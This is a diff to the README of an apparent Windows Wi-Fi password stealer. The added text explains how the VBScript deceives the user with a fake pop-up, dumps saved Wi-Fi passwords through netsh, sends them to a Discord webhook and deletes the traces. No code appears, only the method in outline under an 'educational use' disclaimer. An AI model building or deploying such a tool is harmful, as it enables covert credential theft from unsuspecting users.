@@ -2,9 +2,23 @@
 
 ## :warning: This script is provided for responsible educational use. I do not condone or support its use in unethical or illegal activities. :warning:
 
-This script is a wifi stealer that sends every wifi passwords stored on a Windows 10/11 computer to a [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
+This script is a wifi password Grabber that fetched the wifi-profiles of every wifi passwords stored on a Windows 10/11 system and sends it to a [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
 
-It is made to be used with a [Flipper Zero](https://flipperzero.one/) device, using the [BadUSB](https://docs.flipperzero.one/bad-usb) feature.
+This VBScript:
+
+Creates a Shell object to run Windows commands.
+
+Displays a fake pop-up to make the user think it's a harmless script.
+
+Exports all saved Wi-Fi profiles with cleartext passwords using netsh.
+
+Parses those .xml files with PowerShell to extract SSIDs and passwords.
+
+Formats the credentials into a table.
+
+Sends them to a Discord webhook.
+
+Cleans up traces by deleting the .xml files.
 
 # Files
 ### Powershell scripts
